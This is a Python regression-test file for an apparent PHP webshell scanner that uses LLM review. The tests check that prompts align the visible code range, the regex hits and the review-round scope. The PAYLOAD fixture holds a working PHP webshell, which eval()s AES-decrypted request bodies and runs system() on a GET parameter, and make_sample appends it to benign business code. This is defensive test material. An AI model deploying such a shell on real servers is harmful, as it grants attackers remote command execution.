"""Prompt 可见性对齐回归测试。

背景：小文件模式下代码块按 CODE_DISPLAY_BUDGET 截断，但正则命中此前仍按全文件
注入并要求"逐条深度定性，不得遗漏"——模型被迫为它看不见的行编造结论。
本测试锁定"可见区间 ↔ 正则锚点 ↔ 复核轮证据范围"三者一致。
"""
import unittest

from shellsentry.core.agent_review import build_review_prompt
from shellsentry.core.prompts import (
    CODE_DISPLAY_BUDGET,
    build_hl_seed_context,
    build_regex_context,
    build_user_prompt,
    visible_line_limit,
)


BENIGN_BLOCK = '''<?php
// 订单查询服务 - 良性业务代码
function fmtMoney($cents) {
    $sign = $cents < 0 ? "-" : "";
    $v = abs(intval($cents));
    return $sign . sprintf("%.2f", $v / 100);
}

function buildWhere($status, $uid) {
    $w = array("1=1");
    if ($status !== null) { $w[] = "status = '" . addslashes($status) . "'"; }
    if ($uid > 0) { $w[] = "uid = " . intval($uid); }
    return implode(" AND ", $w);
}
'''

PAYLOAD = '''session_start();
$key = "e45e329feb5d925b";
$post = file_get_contents("php://input");
$dec = openssl_decrypt(base64_decode($post), "AES-128-ECB", $key, OPENSSL_RAW_DATA);
eval($dec);
system($_GET["c"]);
?>'''


def make_sample(target_chars: int) -> str:
    body = BENIGN_BLOCK
    while len(body) < target_chars - len(PAYLOAD) - 100:
        body += "\n" + BENIGN_BLOCK
    return body + "\n" + PAYLOAD


def synthetic_scan(hits) -> dict:
    return {
        "total_matches": len(hits),
        "triggered_rules": sorted({h["rule_id"] for h in hits}),
        "matches_by_category": {},
        "language_hints": ["php"],
        "matches": hits,
    }


class VisibleLineLimitTests(unittest.TestCase):
    def test_short_code_is_not_truncated(self):
        self.assertIsNone(visible_line_limit(BENIGN_BLOCK))

    def test_small_file_is_fully_visible(self):
        """方案 D：<SMALL_FILE_THRESHOLD 的文件必须完整可见，不再丢后半部分。

        改动前 12000 字符/约 250 行的文件只能看到前 174 行（丢 30%），
        且丢失部分没有任何一轮 AI 看过。
        """
        code = make_sample(12000)
        self.assertIsNone(visible_line_limit(code), "小文件不得再被展示预算截断")
        prompt = build_user_prompt(code, "big.php", None, len(code))
        self.assertNotIn("未展示", prompt)
        # 末行（恶意载荷所在处）必须真正出现在 prompt 中
        total = code.count("\n") + 1
        self.assertIn(f"[LINE_{total}]", prompt)
        self.assertIn("system($_GET", prompt)

    def test_oversized_file_still_truncates_with_protection(self):
        """超过小文件阈值的输入仍受保护：收窄可见区间 + 禁止定性未见行。"""
        code = make_sample(40000)
        end = visible_line_limit(code)
        self.assertIsNotNone(end)
        total = code.count("\n") + 1
        self.assertLess(end, total)
        self.assertGreater(end, 10)

    def test_single_line_overflow_flags_partial_content(self):
        """单行超长陷阱：字符被截断但行数没丢，必须返回行号而不是 None。

        改动前 visible_line_limit 返回 None（判为"全文可见"），导致全部命中被注入、
        模型被要求定性它根本没看到的行内容，且全程无告警。
        """
        code = "A" * 40000
        self.assertEqual(visible_line_limit(code), 1)
        prompt = build_user_prompt(code, "oneline.php", None, len(code))
        self.assertIn("未完整展示", prompt)
        self.assertIn("需完整代码复核", prompt)


class UserPromptVisibilityTests(unittest.TestCase):
    def test_untruncated_prompt_keeps_original_anchor_rule(self):
        prompt = build_user_prompt(BENIGN_BLOCK, "small.php", None, len(BENIGN_BLOCK))
        self.assertIn("正则命中的行号必须逐条深度定性", prompt)
        self.assertNotIn("未展示区域", prompt)

    def test_truncated_prompt_declares_visible_range_and_forbids_hidden_qualification(self):
        code = make_sample(40000)
        end = visible_line_limit(code)
        total = code.count("\n") + 1
        prompt = build_user_prompt(code, "huge.php", None, len(code))

        self.assertIn(f"仅展示第 1–{end} 行", prompt)
        self.assertIn(f"第 {end + 1}–{total} 行未展示", prompt)
        # 锚点要求必须跟随可见区间收窄，不得再要求"全部命中逐条定性"
        self.assertIn(f"第 1–{end} 行的正则命中必须逐条深度定性", prompt)

    def test_truncated_prompt_does_not_cut_mid_line(self):
        code = make_sample(40000)
        prompt = build_user_prompt(code, "huge.php", None, len(code))
        # 展示窗口回退到最后一个完整行，代码块内不应出现半行残片
        body = prompt.split("```php\n", 1)[1].split("\n```", 1)[0]
        self.assertTrue(body.startswith("[LINE_1]"))
        self.assertLessEqual(len(body), CODE_DISPLAY_BUDGET)


class RegexContextScopingTests(unittest.TestCase):
    def test_visible_hits_stay_in_main_table(self):
        scan = synthetic_scan([
            {"rule_id": "PHP-EXEC-001", "line_number": 5, "severity": "critical",
             "category": "code_execution", "description": "eval", "matched_text": "eval("},
        ])
        ctx = build_regex_context(scan, 100)
        self.assertIn("| PHP-EXEC-001 | L5 |", ctx)
        self.assertNotIn("未展示区域", ctx)

    def test_hidden_hits_move_to_forbidden_section(self):
        scan = synthetic_scan([
            {"rule_id": "PHP-EXEC-001", "line_number": 5, "severity": "critical",
             "category": "code_execution", "description": "eval", "matched_text": "eval("},
            {"rule_id": "PHP-EXEC-002", "line_number": 355, "severity": "critical",
             "category": "code_execution", "description": "system", "matched_text": "system("},
        ])
        ctx = build_regex_context(scan, 241)
        self.assertIn("| PHP-EXEC-001 | L5 |", ctx)
        self.assertNotIn("| PHP-EXEC-002 | L355 | critical | code_execution |", ctx)
        self.assertIn("未展示区域的正则命中", ctx)
        self.assertIn("| PHP-EXEC-002 | L355 |", ctx)
        self.assertIn("严禁推测其内容", ctx)

    def test_all_hidden_reports_no_visible_hit_without_claiming_no_match(self):
        scan = synthetic_scan([
            {"rule_id": "PHP-EXEC-002", "line_number": 355, "severity": "critical",
             "category": "code_execution", "description": "system", "matched_text": "system("},
        ])
        ctx = build_regex_context(scan, 241)
        # 不能说成"未命中任何特征"——那会让模型以为文件干净
        self.assertNotIn("未命中任何特征", ctx)
        self.assertIn("展示区域内无正则命中", ctx)

    def test_no_visible_limit_preserves_legacy_output(self):
        scan = synthetic_scan([
            {"rule_id": "PHP-EXEC-001", "line_number": 5, "severity": "critical",
             "category": "code_execution", "description": "eval", "matched_text": "eval("},
        ])
        self.assertEqual(build_regex_context(scan), build_regex_context(scan, None))


class HighlightSeedRankingTests(unittest.TestCase):
    def test_critical_seed_survives_tight_budget(self):
        hits = [
            {"rule_id": "X", "line_number": 1, "severity": "medium",
             "category": "obfuscation", "description": "d", "matched_text": "aaa"},
            {"rule_id": "X", "line_number": 2, "severity": "medium",
             "category": "obfuscation", "description": "d", "matched_text": "bbb"},
            {"rule_id": "X", "line_number": 3, "severity": "medium",
             "category": "obfuscation", "description": "d", "matched_text": "ccc"},
            {"rule_id": "Y", "line_number": 90, "severity": "critical",
             "category": "code_execution", "description": "d", "matched_text": "eval("},
        ]
        ctx = build_hl_seed_context(synthetic_scan(hits), max_seeds=2)
        self.assertIn("L90", ctx)
        self.assertIn("eval(", ctx)
        self.assertNotIn("ccc", ctx)


class ReviewPromptAlignmentTests(unittest.TestCase):
    def test_visible_range_is_propagated_to_review(self):
        prompt = build_review_prompt(
            BENIGN_BLOCK, "big.php", None, "first round report",
            first_report_visible_end_line=241,
        )
        self.assertIn("第一轮模型仅看到原始代码第 1–241 行", prompt)
        self.assertIn("L242+ 超出首轮展示范围", prompt)

    def test_without_limit_review_prompt_unchanged_shape(self):
        prompt = build_review_prompt(BENIGN_BLOCK, "big.php", None, "first round report")
        self.assertNotIn("可见范围提示", prompt)


if __name__ == "__main__":
    unittest.main()
